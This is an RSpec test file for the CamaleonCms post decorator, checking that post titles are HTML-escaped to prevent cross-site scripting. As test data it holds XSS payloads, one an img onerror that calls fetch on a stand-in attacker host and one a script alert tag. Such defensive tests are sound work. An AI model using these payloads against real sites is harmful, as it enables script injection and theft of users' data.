# frozen_string_literal: true

require 'rails_helper'

RSpec.describe CamaleonCms::PostDecorator do
  let(:post) { create(:post, title: title) }
  let(:decorator) { post.decorate }

  describe '#the_title - XSS prevention' do
    let(:title) { 'Test Post' }

    it 'escapes HTML in post titles' do
      post.title = '<img src=x onerror=fetch(attacker.com)>'
      expect(decorator.the_title).to include('&lt;img')
    end

    it 'renders safe titles normally' do
      post.title = 'Safe Title'
      expect(decorator.the_title).to eq('Safe Title')
    end

    it 'escapes script tags' do
      post.title = '<script>alert(1)</script>'
      expect(decorator.the_title).not_to include('<script>')
      expect(decorator.the_title).to include('&lt;script&gt;')
    end
  end
end
